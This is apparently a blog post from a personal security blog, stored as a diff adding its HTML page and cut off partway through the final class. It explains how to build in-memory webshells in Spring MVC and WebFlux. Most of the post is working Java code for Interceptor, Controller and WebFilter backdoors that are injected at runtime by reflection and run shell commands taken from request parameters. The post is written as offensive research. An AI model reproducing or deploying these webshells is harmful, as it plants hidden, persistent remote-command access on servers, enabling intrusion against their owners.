@@ -1,0 +1,703 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>SpringMemShell | Arcueid&#39;s BLOG</title>
+    <meta name="author" content="Arcueid" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/Arcueid.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.net" />
+<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>ARCUEID&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;ARCUEID&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>SpringMemShell</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/4/1
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/java/" style="color: #ffa2c4">java</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="SpringDemo"><a href="#SpringDemo" class="headerlink" title="SpringDemo"></a>SpringDemo</h1><p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404012049845.png" alt="image-20240314170159798"></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404012049827.png" alt="image-20240314170500146"></p>
+<p>直接run 里面内置了一个BasicController</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404012049838.png" alt="image-20240314170936452"></p>
+<span id="more"></span>
+
+<h2 id="编写Controller"><a href="#编写Controller" class="headerlink" title="编写Controller"></a>编写Controller</h2><pre><code class="java">package com.arcueid.springmemshell.demos.web;
+
+import org.springframework.stereotype.Controller;
+import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.ResponseBody;
+
+@Controller
+public class TestController &#123;
+    @RequestMapping(&quot;/test&quot;)
+    @ResponseBody
+    public String sayHello()&#123;
+        return &quot;Hello&quot;;
+    &#125;
+&#125;
+</code></pre>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404012049834.png" alt="image-20240314171437861"></p>
+<h2 id="编写Interceptor"><a href="#编写Interceptor" class="headerlink" title="编写Interceptor"></a>编写Interceptor</h2><p>类似filter</p>
+<p>需要继承HandlerInterceptorAdapter</p>
+<pre><code class="java">package com.arcueid.springmemshell.demos.web;
+
+import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
+
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.PrintWriter;
+import java.util.stream.Collectors;
+
+public class TestInterceptor extends HandlerInterceptorAdapter &#123;
+
+    @Override
+    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;
+
+        String cmd = request.getParameter(&quot;cmd&quot;);
+        if (cmd == null || !cmd.equals(&quot;&quot;)) &#123;
+            PrintWriter out = response.getWriter();
+            ProcessBuilder processBuilder;
+            if(System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;))&#123;
+                processBuilder = new ProcessBuilder(&quot;cmd.exe&quot;,&quot;/c&quot;,cmd);
+            &#125;else&#123;
+                processBuilder = new ProcessBuilder(&quot;/bin/bash&quot;,&quot;-c&quot;,cmd);
+            &#125;
+
+            InputStream inputStream = processBuilder.start().getInputStream();
+            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
+            String res = bufferedReader.lines().collect(Collectors.joining());
+            out.write(res);
+            out.flush();
+            out.close();
+        &#125;
+        return super.preHandle(request, response, handler);
+    &#125;
+&#125;
+</code></pre>
+<p>然后新建</p>
+<p>WebConfig.java</p>
+<p>需要实现WebMvcConfigure接口</p>
+<pre><code class="java">package com.arcueid.springmemshell.demos.web;
+
+import org.springframework.context.annotation.Configuration;
+import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
+import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;
+
+@Configuration
+public class WebConfig implements WebMvcConfigurer &#123;
+    @Override
+    public void addInterceptors(InterceptorRegistry registry) &#123;
+        registry.addInterceptor(new TestInterceptor()).addPathPatterns(&quot;/**&quot;);
+    &#125;
+&#125;
+</code></pre>
+<p>启动后对任意路径 添加参数cmd即可rce</p>
+<h1 id="Controller-mem-shell"><a href="#Controller-mem-shell" class="headerlink" title="Controller mem shell"></a>Controller mem shell</h1><p>类似servlet mem shell的注册</p>
+<p>servlet mem shell需要动态注册一个servlet 以及 servlet-mapping</p>
+<p>Controller也是类似的 一个 Controller 以及 Requestmapping</p>
+<p>在<code>AbstractHandlerMethodMapping#initHandlerMethods</code>上打断点</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404012049806.png" alt="image-20240329084944294"></p>
+<p>遍历所有的bean拿beanType</p>
+<p>再通过isHandler来判断这个bean是否是一个Controller或RequestMapping注解修饰</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404012049788.png" alt="image-20240329090200893"></p>
+<p>跟进<code>detectHandlerMethods</code></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404012049738.png" alt="image-20240329085312502"></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404012049898.png" alt="image-20240329090400779"></p>
+<p>拿到全限定类名 再遍历类中的方法添加</p>
+<p>其中在getMappingForMethod()方法中，会解析Controller类的方法中的注解，从而生成一个与之对应的RequestMappingInfo对象，里面保存了访问Method的url条件</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404012049076.png" alt="image-20240329092817384"></p>
+<p>之后将bean，Method，RequestMappingInfo注册进MappingRegistry</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404012049104.png" alt="image-20240329093546242"></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404012049152.png"></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404012049210.png" alt="image-20240329093620037"></p>
+<p>至此完成整个映射过程</p>
+<p>也就是我们需要将恶意Controller的handler method 和 requestMappingInfo都注册进mappingRegistry</p>
+<p>接下来解决如何动态注册Controller的问题</p>
+<p><code>https://www.anquanke.com/post/id/198886#h3-7</code></p>
+<h3 id="获得当前代码运行时的上下文环境"><a href="#获得当前代码运行时的上下文环境" class="headerlink" title="获得当前代码运行时的上下文环境"></a>获得当前代码运行时的上下文环境</h3><p>1: <code>WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</code></p>
+<p>2: <code>WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes()        .getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;,0);</code></p>
+<h3 id="手动注册Controller"><a href="#手动注册Controller" class="headerlink" title="手动注册Controller"></a>手动注册Controller</h3><p>调用<code>RequestMappingHandlerMapping#registerMapping</code></p>
+<pre><code class="java">package com.arcueid.springmemshell.demos.web;
+
+import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.ResponseBody;
+import org.springframework.web.bind.annotation.RestController;
+import org.springframework.web.context.WebApplicationContext;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.context.request.ServletRequestAttributes;
+import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
+import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
+import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
+import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
+
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.lang.reflect.Method;
+import java.util.stream.Collectors;
+
+@RestController
+public class Arcueid &#123;
+    @ResponseBody
+    @RequestMapping(&quot;/inject&quot;)
+    public String inject() throws Exception&#123;
+        String controllerName = &quot;/Arcueid&quot;;
+        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes()
+                .getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;,0);
+        // 从context中获取RequestMappingHandlerMapping的实例bean
+        RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
+        Method methodExec = Evil.class.getMethod(&quot;exec&quot;);
+        PatternsRequestCondition urlPattern = new PatternsRequestCondition(controllerName);
+        RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();
+        RequestMappingInfo info = new RequestMappingInfo(urlPattern,condition,null,null,null,null,null);
+        Evil evil = new Evil();
+        requestMappingHandlerMapping.registerMapping(info,evil,methodExec);
+        return  &quot;done!&quot;;
+    &#125;
+    @RestController
+    public static class Evil&#123;
+        public Evil() &#123;
+        &#125;
+
+        public void exec() throws Exception&#123;
+            HttpServletRequest request = ((ServletRequestAttributes)(RequestContextHolder.currentRequestAttributes())).getRequest();
+            HttpServletResponse response = ((ServletRequestAttributes)(RequestContextHolder.currentRequestAttributes())).getResponse();
+
+            String cmd = request.getParameter(&quot;cmd&quot;);
+            if(cmd != null)&#123;
+                boolean isLinux = true;
+                String osType = System.getProperty(&quot;os.name&quot;);
+                if (osType != null &amp;&amp; osType.toLowerCase().contains(&quot;win&quot;))&#123;
+                    isLinux = false;
+                &#125;
+                String[] cmds = isLinux ? new String[]&#123;&quot;bash&quot;,&quot;-c&quot;,cmd&#125; : new String[]&#123;&quot;cmd.exe&quot;,&quot;/c&quot;,cmd&#125;;
+                InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
+                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
+                String res = bufferedReader.lines().collect(Collectors.joining(&quot;\n&quot;));
+                response.getWriter().write(res);
+            &#125;
+
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<h1 id="Interceptor-mem-shell"><a href="#Interceptor-mem-shell" class="headerlink" title="Interceptor mem shell"></a>Interceptor mem shell</h1><p>新建的路由如果不在网关的白名单内 很可能无法访问到 也就是说 注入了也用不了</p>
+<p>基于Interceptor的内存马应运而生</p>
+<p>随便写一个Interceptor</p>
+<p>在preHandle上下断点</p>
+<p>一步步跟进到<code>DispatcherServlet#doDispatch</code></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404012049565.png" alt="image-20240330202809539"></p>
+<p>步入getHandler</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404012049103.png" alt="image-20240330204938620"></p>
+<p>通过遍历当前<code>handlerMapping</code>数组中的<code>handler</code>对象，来判断哪个<code>handler</code>来处理当前的<code>request</code>对象：</p>
+<p>重点关注<code>getHandlerExecutionChain</code></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404012049982.png" alt="image-20240330220139110"></p>
+<p>遍历<code>adaptedInterceptors</code>，判断拦截器是否是<code>MappedInterceptor</code>类型，如果是那就看<code>MappedInterceptor</code>是否匹配当前请求，如果匹配则将其实际的拦截器添加到执行链中，如果不是这个类型的那就直接将拦截器添加到执行链中。</p>
+<p>这里往HandlerExecutionChain中add了一个Interceptor</p>
+<p>大概逻辑是这样 现在考虑如何注入</p>
+<p>通过反射修改adaptedInterceptors的值 当 <code>getMappedInterceptors</code>遍历时 会将恶意Interceptor注册进去</p>
+<p>反射拿adaptedInterceptors即可</p>
+<pre><code class="java">package com.arcueid.springmemshell.demos.web;
+
+import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.RestController;
+import org.springframework.web.context.WebApplicationContext;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.servlet.handler.AbstractHandlerMapping;
+import org.springframework.web.servlet.handler.MappedInterceptor;
+
+import java.lang.reflect.Field;
+import java.util.ArrayList;
+
+@RestController
+public class Injector &#123;
+    @RequestMapping(&quot;inter&quot;)
+    public String inject() throws Exception &#123;
+        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes()
+                .getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;,0);
+        AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping)context.getBean(&quot;requestMappingHandlerMapping&quot;);
+
+        Field fieldAdaptedInterceptors = AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);
+        fieldAdaptedInterceptors.setAccessible(true);
+        ArrayList&lt;Object&gt; adaptedInterceptors = (ArrayList&lt;Object&gt;)(fieldAdaptedInterceptors.get(abstractHandlerMapping));
+        MappedInterceptor mappedInterceptor = new MappedInterceptor(new String[]&#123;&quot;/*&quot;&#125;,null,new TestInterceptor());
+        adaptedInterceptors.add(mappedInterceptor);
+
+        return &quot;done!&quot;;
+    &#125;
+&#125;
+</code></pre>
+<p>这样已经可以实现了</p>
+<h1 id="WebFulx-mem-shell"><a href="#WebFulx-mem-shell" class="headerlink" title="WebFulx mem shell"></a>WebFulx mem shell</h1><p><code>GreetingHandler.java</code></p>
+<pre><code class="java">package com.arcueid.demowebfluxmemshell;
+
+import org.springframework.http.MediaType;
+import org.springframework.stereotype.Component;
+import org.springframework.web.reactive.function.BodyInserters;
+import org.springframework.web.reactive.function.server.ServerRequest;
+import org.springframework.web.reactive.function.server.ServerResponse;
+import reactor.core.publisher.Mono;
+
+@Component
+public class GreetingHandler &#123;
+    public Mono&lt;ServerResponse&gt; hello(ServerRequest request) &#123;
+        return ServerResponse.ok().contentType(MediaType.TEXT_PLAIN).body(BodyInserters.fromValue(&quot;Hello, Spring!&quot;));
+    &#125;
+&#125;
+</code></pre>
+<p><code>GreetingRouter.java</code></p>
+<pre><code class="java">package com.arcueid.demowebfluxmemshell;
+
+import org.springframework.context.annotation.Bean;
+import org.springframework.context.annotation.Configuration;
+import org.springframework.http.MediaType;
+import org.springframework.web.reactive.function.server.*;
+
+@Configuration
+public class GreetingRouter &#123;
+    @Bean
+    public RouterFunction&lt;ServerResponse&gt; route(GreetingHandler greetingHandler) &#123;
+        return RouterFunctions.route(RequestPredicates.GET(&quot;/hello&quot;).and(RequestPredicates.accept(MediaType.TEXT_PLAIN)), greetingHandler::hello);
+    &#125;
+&#125;
+</code></pre>
+<p>对于<code>Spring WebFlux</code>而言，由于没有拦截器和监听器这个概念，要想实现权限验证和访问控制的话，就得使用<code>Filter</code></p>
+<p>而在<code>Spring Webflux</code>中，存在两种类型的过滤器：一个是<code>WebFilter</code>，实现自<code>org.springframework.web.server.WebFilter</code>接口。通过实现这个接口，可以定义全局的过滤器，它可以在请求被路由到<code>handler</code>之前或者之后执行一些逻辑；另一个就是<code>HandlerFilterFunction</code>，它是一种函数式编程的过滤器类型，实现自<code>org.springframework.web.reactive.function.server.HandlerFilterFunction</code>接口，与<code>WebFilter</code>相比它更加注重函数式编程的风格，可以用于处理基于路由的过滤逻辑</p>
+<p>写一个WebFilter</p>
+<pre><code class="java">package com.arcueid.demowebfluxmemshell;
+
+import org.springframework.http.server.reactive.ServerHttpRequest;
+import org.springframework.stereotype.Component;
+import org.springframework.web.server.ServerWebExchange;
+import org.springframework.web.server.WebFilter;
+import org.springframework.web.server.WebFilterChain;
+import org.springframework.web.util.pattern.PathPattern;
+import org.springframework.web.util.pattern.PathPatternParser;
+import reactor.core.publisher.Mono;
+
+@Component
+public class GreetingFilter implements WebFilter &#123;
+    @Override
+    public Mono&lt;Void&gt; filter(ServerWebExchange exchange, WebFilterChain chain) &#123;
+        PathPattern pattern = new PathPatternParser().parse(&quot;/hello/**&quot;);
+        ServerHttpRequest request = exchange.getRequest();
+        if (pattern.matches(request.getPath().pathWithinApplication()))&#123;
+            System.out.println(&quot;11111&quot;);
+        &#125;
+        return chain.filter(exchange);
+
+    &#125;
+&#125;
+</code></pre>
+<p>在filter上打断点开调</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404012049073.png" alt="image-20240401174239498"></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404012049112.png" alt="image-20240401175051133"></p>
+<p>跟进发现会去调<code>DefaultWebFilterChain#invokeFilter</code></p>
+<p>重点关注该类的三个构造方法</p>
+<p>第一个是公开的 Public constructor with the list of filters and the target handler to use.</p>
+<p>第二个是私有的 Private constructor to represent one link in the chain. 用于创建link</p>
+<p>第三个是过时的 </p>
+<p>注释中写道</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404012049242.png" alt="image-20240401175435721"></p>
+<p>每一个实例都是一个link 而不是一个chain 最终的chain有公开的构造方法生成 这就意味着我们无法通过修改下图中的<code>chain.allFilters</code>来实现新增<code>Filter</code></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404012049289.png" alt="image-20240401175618093"></p>
+<p>我们找找FilterChain是怎么初始化的</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404012049940.png" alt="image-20240401175701109"></p>
+<p>可以看见 在内部调用了私有的构造函数 创建link</p>
+<p>那么在哪儿调用的公开构造方法呢 <code>FilterWebHandler</code> 中</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404012049973.png" alt="image-20240401175945090"></p>
+<p>我们反射修改FilteringWebHandler的值为自定义恶意DefaultWebFilterChain</p>
+<p>那现在就剩下传入<code>handler</code>和<code>filters</code>这两个参数了，这个<code>handler</code>参数很好搞，就在<code>chain</code>里面：</p>
+<p>然后这个<code>filters</code>的话，我们可以先获取到它本来的<code>filters</code>，然后把我们自己写的恶意<code>filter</code>放进去，放到第一位，就可以了</p>
+<p>这里利用</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/c0ny1/java-object-searcher">https://github.com/c0ny1/java-object-searcher</a></p>
+<p>来从内存中找到<code>DefaultWebFilterChain</code>的位置</p>
+<p>克隆下来后</p>
+<p><code>mvn clean install</code></p>
+<p>然后把生成的jar包导入的lib中</p>
+<p>改写WebFilter的代码如下</p>
+<pre><code class="java">package com.arcueid.demowebfluxmemshell;
+
+import me.gv7.tools.josearcher.entity.Blacklist;
+import me.gv7.tools.josearcher.entity.Keyword;
+import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;
+import org.springframework.http.server.reactive.ServerHttpRequest;
+import org.springframework.stereotype.Component;
+import org.springframework.web.server.ServerWebExchange;
+import org.springframework.web.server.WebFilter;
+import org.springframework.web.server.WebFilterChain;
+import org.springframework.web.util.pattern.PathPattern;
+import org.springframework.web.util.pattern.PathPatternParser;
+import reactor.core.publisher.Mono;
+
+import java.util.ArrayList;
+import java.util.List;
+
+@Component
+public class GreetingFilter implements WebFilter &#123;
+    @Override
+    public Mono&lt;Void&gt; filter(ServerWebExchange exchange, WebFilterChain chain) &#123;
+        PathPattern pattern = new PathPatternParser().parse(&quot;/hello/**&quot;);
+        ServerHttpRequest request = exchange.getRequest();
+        if (pattern.matches(request.getPath().pathWithinApplication()))&#123;
+            System.out.println(&quot;11111&quot;);
+        &#125;
+
+        List&lt;Keyword&gt; keys = new ArrayList&lt;&gt;();
+        keys.add(new Keyword.Builder().setField_type(&quot;DefaultWebFilterChain&quot;).build());
+        List&lt;Blacklist&gt; blackList = new ArrayList&lt;&gt;();
+        blackList.add(new Blacklist.Builder().setField_type(&quot;java.io.File&quot;).build());
+        SearchRequstByBFS searchRequstByBFS = new SearchRequstByBFS(Thread.currentThread(), keys);
+        searchRequstByBFS.setBlacklists(blackList);
+        searchRequstByBFS.setIs_debug(true);
+        searchRequstByBFS.setMax_search_depth(15);
+        searchRequstByBFS.setReport_save_path(&quot;D:\\javaWeb\\apache-tomcat-8.5.98\\bin&quot;);
+        searchRequstByBFS.searchObject();
+
+
+        return chain.filter(exchange);
+
+    &#125;
+&#125;
+
+</code></pre>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404012049010.png" alt="image-20240401185903718"></p>
+<p>通过反射一层层向下拿到DefaultWebFilterChain即可</p>
+<pre><code class="java">package org.example.webfluxmemoryshelldemo.memoryshell;
+
+import org.springframework.boot.web.embedded.netty.NettyWebServer;
+import org.springframework.context.annotation.Configuration;
+import org.springframework.core.io.buffer.DataBuffer;
+import org.springframework.core.io.buffer.DefaultDataBufferFactory;
+import org.springframework.http.MediaType;
+import org.springframework.http.server.reactive.ReactorHttpHandlerAdapter;
+import org.springframework.http.server.reactive.ServerHttpRequest;
+import org.springframework.http.server.reactive.ServerHttpResponse;
+import org.springframework.web.server.ServerWebExchange;
+import org.springframework.web.server.WebFilter;
+import org.springframework.web.server.WebFilterChain;
+import org.springframework.web.server.WebHandler;
+import org.springframework.web.server.adapter.HttpWebHandlerAdapter;
+import org.springframework.web.server.handler.DefaultWebFilterChain;
+import org.springframework.web.server.handler.ExceptionHandlingWebHandler;
+import org.springframework.web.server.handler.FilteringWebHandler;
+import reactor.core.publisher.Flux;
+import reactor.core.publisher.Mono;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.lang.reflect.Array;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.lang.reflect.Modifier;
+import java.nio.charset.StandardCharsets;
+import java.util.ArrayList;
+import java.util.List;
+
+@Configuration
+public class MemoryShellFilter implements WebFilter&#123;
+
+    public static void doInject() &#123;
+        Method getThreads;
+        try &#123;
+            getThreads = Thread.class.getDeclaredMethod(&quot;getThreads&quot;);
+            getThreads.setAccessible(true);
+            Object threads = getThreads.invoke(null);
+            for (int i = 0; i &lt; Array.getLength(threads); i++) &#123;
+                Object thread = Array.get(threads, i);
+                if (thread != null &amp;&amp; thread.getClass().getName().contains(&quot;NettyWebServer&quot;)) &#123;
+                    NettyWebServer nettyWebServer = (NettyWebServer) getFieldValue(thread, &quot;this$0&quot;, false);
+                    ReactorHttpHandlerAdapter reactorHttpHandlerAdapter = (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, &quot;handler&quot;, false);
+                    Object delayedInitializationHttpHandler = getFieldValue(reactorHttpHandlerAdapter,&quot;httpHandler&quot;, false);
+                    HttpWebHandlerAdapter httpWebHandlerAdapter = (HttpWebHandlerAdapter) getFieldValue(delayedInitializationHttpHandler,&quot;delegate&quot;, false);
+                    ExceptionHandlingWebHandler exceptionHandlingWebHandler = (ExceptionHandlingWebHandler) getFieldValue(httpWebHandlerAdapter,&quot;delegate&quot;, true);
+                    FilteringWebHandler filteringWebHandler = (FilteringWebHandler) getFieldValue(exceptionHandlingWebHandler,&quot;delegate&quot;, true);
+                    DefaultWebFilterChain defaultWebFilterChain = (DefaultWebFilterChain) getFieldValue(filteringWebHandler,&quot;chain&quot;, false);
+                    Object handler = getFieldValue(defaultWebFilterChain, &quot;handler&quot;, false);
+                    List&lt;WebFilter&gt; newAllFilters = new ArrayList&lt;&gt;(defaultWebFilterChain.getFilters());
+                    newAllFilters.add(0, new MemoryShellFilter());
+                    DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters);
+                    Field f = filteringWebHandler.getClass().getDeclaredField(&quot;chain&quot;);
+                    f.setAccessible(true);
+                    Field modifersField = Field.class.getDeclaredField(&quot;modifiers&quot;);
+                    modifersField.setAccessible(true);
+                    modifersField.setInt(f, f.getModifiers() &amp; ~Modifier.FINAL);
+                    f.set(filteringWebHandler, newChain);
+                    modifersField.setInt(f, f.getModifiers() &amp; Modifier.FINAL);
+                &#125;
+            &#125;
+        &#125; catch (Exception ignored) &#123;&#125;
+    &#125;
+
+    public static Object getFieldValue(Object obj, String fieldName,boolean superClass) throws Exception &#123;
+        Field f;
+        if(superClass)&#123;
+            f = obj.getClass().getSuperclass().getDeclaredField(fieldName);
+        &#125;else &#123;
+            f = obj.getClass().getDeclaredField(fieldName);
+        &#125;
+        f.setAccessible(true);
+        return f.get(obj);
+    &#125;
+
+    public Flux&lt;DataBuffer&gt; getPost(ServerWebExchange exchange) &#123;
+        ServerHttpRequest request = exchange.getRequest();
+        String path = request.getURI().getPath();
+        String query = request.getURI().getQuery();
+
+        if (path.equals(&quot;/evil/cmd&quot;) &amp;&amp; query != null &amp;&amp; query.startsWith(&quot;command=&quot;)) &#123;
+            String command = query.substring(8);
+            try &#123;
+                Process process = Runtime.getRuntime().exec(&quot;cmd /c&quot; + command);
+                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), &quot;GBK&quot;));
+                Flux&lt;DataBuffer&gt; response = Flux.create(sink -&gt; &#123;
+                    try &#123;
+                        String line;
+                        while ((line = reader.readLine()) != null) &#123;
+                            sink.next(DefaultDataBufferFactory.sharedInstance.wrap(line.getBytes(StandardCharsets.UTF_8)));
+                        &#125;
+                        sink.complete();
+                    &#125; catch (IOException ignored) &#123;&#125;
+                &#125;);
+
+                exchange.getResponse().getHeaders().setContentType(MediaType.TEXT_PLAIN);
+                return response;
+            &#125; catch (IOException ignored) &#123;&#125;
+        &#125;
+        return Flux.empty();
+    &#125;
+
+    @Override
